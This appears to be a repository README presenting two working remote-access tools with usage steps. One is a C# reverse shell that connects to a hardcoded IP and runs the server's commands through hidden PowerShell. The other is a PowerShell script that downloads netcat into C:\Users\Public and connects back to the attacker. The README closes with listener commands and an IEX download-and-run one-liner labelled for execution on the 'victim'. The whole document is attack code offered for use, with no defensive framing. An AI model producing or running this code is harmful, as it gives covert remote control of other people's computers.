## Robert Chaves Perez (r0b0t95) 2023

**C# script**

```C#
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace cc
{
    public class Program
    {
        public static void Main(string[] args)
        {
            /*
             * r0b0t95 2023
             */

            if (args.Length == 2)
            {
                string serverIp = "192.168.23.129"; //args[0];
                int port = 8001; //Convert.ToInt16(args[1]);

                TcpClient client = new TcpClient(serverIp, port);
                NetworkStream stream = client.GetStream();

                Byte[] data = new Byte[4096];

                StringBuilder cmd = new StringBuilder();

                while (true)
                {
                    try
                    {
                        // request from SERVER
                        Int32 bytes = stream.Read(data, 0, data.Length);
                        cmd.Append(Encoding.ASCII.GetString(data, 0, bytes));

                        var cmdOutput = ShellCMD(cmd.ToString());

                        // responce to SERVER
                        data = Encoding.ASCII.GetBytes(cmdOutput);
                        stream.Write(data, 0, data.Length);
                        cmd.Clear();
                    }
                    catch (ArgumentNullException)
                    {
                    }
                    catch (SocketException)
                    {
                    }
                }
            }
        }

        // command shell
        private static string ShellCMD(string cmd)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append("Victim: \n");

            if (cmd.Contains("cd"))
            {
                ChangeDirectory(cmd.Replace("cd", ""));
                sb.Append("Directory changed");
            }
            else
            {
                sb.Append(ExecuteCommands(cmd));
            }

            return sb.ToString();
        }

        // method for execute CMD command prompt command
        private static string ExecuteCommands(string cmd)
        {
            StringBuilder sb = new StringBuilder();
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();

            try
            {
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "powershell.exe";
                startInfo.Arguments = "/c " + cmd;
                startInfo.UseShellExecute = false;
                process.StartInfo = startInfo;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                sb.Append(process.StandardOutput.ReadToEnd());
                process.WaitForExit();
            }
            catch (Exception ObjectExeption)
            {
                sb.Append(ObjectExeption.Message);
            }

            return sb.ToString();
        }


        // change directory
        private static void ChangeDirectory(string cmd)
        {
            string path = SortPath(cmd);

            try
            {
                Directory.SetCurrentDirectory(path);
            }
            catch (DirectoryNotFoundException) { }
            catch (IOException) { }
        }


        private static string SortPath(string path)
        {
            if (path.Contains(".."))
            {
                string currentPath = Directory.GetCurrentDirectory();

                string newPath = Path.GetDirectoryName(currentPath);

                if (!string.IsNullOrEmpty(newPath))
                {
                    return newPath;
                }

                return path;
            }
            if (path.Contains("C:/root"))
            {
                return @"C:\";
            }
            if (string.Equals(path, "D:/root"))
            {
                return @"D:\";
            }
            if (string.Equals(path, "E:/root"))
            {
                return @"E:\";
            }
            if (string.Equals(path, "F:/root"))
            {
                return @"F:\";
            }
            if (string.Equals(path, "G:/root"))
            {
                return @"G:\";
            }
            if (path.Contains("/"))
            {
                string currentPath = Directory.GetCurrentDirectory();
                return currentPath + path.Replace("/", "\\").Trim();
            }
            else
            {
                return path;
            }
        }


    }
}
```

**Invoke-nc.ps1**

```powershell
<#
Robert Chaves Perez (r0b0t95) 2023

python3 -m http.server 8000

nc -lvnp 8001

IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/invoke-nc.ps1") | powershell -noprofile
#>

#change the ip by your IP
$ip = '192.168.23.129'
$portNetCat = '8001'
$portPython3 = '8000'

$files = 'nc.exe', 'nc.pdb'

for ($i = 0; $i -lt $files.Length; ++$i){

   $path = 'C:\Users\Public\' + $files[$i]
        
   $fileUrl = 'http://' + $ip + ':' + $portPython3 + '/' + $files[$i]

   Invoke-WebRequest -Uri $fileUrl -Outfile $path
   
}

Start-Sleep -Seconds 1

Set-Location C:\Users\Public

.\nc.exe $ip $portNetCat
```

**Execute from your server**
```bash
python3 -m http.server 8000

nc -lvnp 8001
```

**Execute from victim**
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/invoke-nc.ps1") | powershell -noprofile
```